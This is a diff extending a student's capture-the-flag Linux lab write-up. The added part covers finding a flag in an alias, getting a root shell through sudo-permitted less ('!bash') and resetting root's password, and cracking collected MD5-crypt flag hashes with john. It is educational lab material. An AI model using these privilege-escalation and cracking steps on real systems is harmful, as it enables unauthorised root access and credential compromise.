@@ -168,7 +168,7 @@ head -6 flag5.sh
 ./flag5.sh
 
 ##### 9. Inspect the error message and notice the missing "then" in the if statement
-# Add the missing "then" after "if [ ${#file} -gt $width ]"
+##### Add the missing "then" after "if [ ${#file} -gt $width ]"
 
 ##### 10. Run the script again
 ./flag5.sh
@@ -177,3 +177,115 @@ head -6 flag5.sh
 
 
 ![Screenshot 2024-10-31 at 8 54 49 PM](https://github.com/user-attachments/assets/d8bc1a79-640f-434f-82a8-222e43d24c95)
+
+
+
+## Finding Flag 6  
+- Flag 6 Indicator: Inspect this user's custom aliases and run the suspicious on to find the proper flag.
+
+### Steps/Commands to Locate and Retrieve Flag 6
+
+##### 1. Log in as the sysadmin user
+su sysadmin
+##### Enter the password
+
+##### 2. Navigate to the sysadmin user's home directory
+cd
+
+##### 3. Run the alias command to list all custom aliases for the sysadmin user
+alias
+
+##### 4. Find the alias definition for 'flag' in the list:
+# alias flag='echo You found \'flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1\''
+
+##### 5. Run the flag alias to display the flag
+flag
+
+##### 6. The flag will be displayed:
+
+
+![Screenshot 2024-10-31 at 8 56 14 PM](https://github.com/user-attachments/assets/47616afe-47b8-4608-bd2a-8423c471d9c1)
+
+
+
+## Finding Flag 7  
+- Flag 7 Indicator: Find and exploit to gain a root shell.
+
+### Steps/Commands to Locate and Retrieve Flag 7
+
+##### 1. Check which commands the sysadmin user can run with sudo
+sudo -l
+
+##### Output will indicate that sysadmin can run /usr/bin/less with sudo
+
+##### 2. Create an empty file and run less with sudo
+touch file && sudo less file
+
+##### 3. Drop into a root shell from less by entering the following commands:
+##### : then !bash
+
+##### 4. Change the password for the root user
+passwd
+##### Enter the new password when prompted and confirm it
+
+##### 5. Exit the root shell
+exit
+
+##### 6. Log in as the root user with the new password
+su root
+##### Enter the new password for root when prompted
+
+
+![Screenshot 2024-10-31 at 9 08 26 PM](https://github.com/user-attachments/assets/2b1f2d4f-2cb8-491d-9262-99420e8a3d9d)
+
+
+
+## Finding Flag 8  
+- Flag 8 Indicator: Gather each of the 7 flags into a file and format it as if each flag was a username and password. Crack the passwords for the final flag.
+
+### Steps/Commands to Locate and Retrieve Flag 8
+
+##### 1. Search for all references to 'flag' in /home/ and output to the terminal
+grep -ir 'flag' /home/
+
+##### 2. Output the search results to a file called "flags"
+grep -ir 'flag' /home/ > flags
+
+##### 3. Append the contents of /var/tmp/5galf to the "flags" file
+cat /var/tmp/5galf >> flags
+
+##### 4. Search for 'flag' in the root user's .bashrc file and append to "flags"
+grep -r 'flag' /root/.bashrc >> flags
+
+##### 5. Edit the "flags" file with nano to remove unnecessary text, backslashes, and extra characters
+nano flags
+##### The file should now look like this:
+##### flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
+##### flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
+##### flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
+##### flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
+##### flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
+##### flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
+##### flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
+
+##### 6. Crack the "flags" file with john using the pass_list.txt file found in /home/student/Desktop/.pass_list.txt
+john --wordlist=/home/student/Desktop/.pass_list.txt flags
+
+##### 7. Once john completes, use the "--show" option to display the cracked passwords
+john --show flags
+##### Output:
+##### flag_1:Congratulations
+##### flag_2:You
+##### flag_3:have
+##### flag_4:completed
+##### flag_5:this
+##### flag_6:cyber
+##### flag_7:challenge.
+
+
+## Key Takaways: 
+- This lab provided a comprehensive hands-on experience with Linux system administration, security, and command-line tools. It involved exploring directories and files using commands like `ls`, `cd`, `grep`, and `find` to locate specific content and understand file structures. A key focus was on interpreting and modifying file permissions with `chmod` and `ls -l`, emphasizing the roles of owner, group, and others in access control. Debugging shell scripts was another essential skill developed, involving the identification and correction of errors using tools like `nano` and `head`. The lab also highlighted the utility of aliases to simplify repetitive commands and how to locate and understand pre-defined configurations. 
+
+Privilege escalation was explored by leveraging `sudo` to execute specific commands with elevated rights, demonstrating the risks of misconfigured `sudo` permissions. Techniques like using `less` with `sudo` to access a root shell underscored the importance of security in system administration. Password management and cracking were integral components, including changing user passwords with `passwd`, switching users with `su`, and cracking hashes with tools like `john` using a provided wordlist. I also practiced combining and processing file contents with commands like `cat` and `>>`, followed by cleaning and organizing data using text editors like `nano`.
+
+The lab emphasized the importance of secure configuration and minimal privilege principles. It demonstrated the risks of weak passwords and misconfigured privileges while teaching critical skills like command chaining, piping, and understanding the basics of hash formats. Ultimately, this project offered a robust introduction to Linux environments, security principles, and system administration tools, fostering critical thinking and practical expertise essential for cybersecurity professionals.
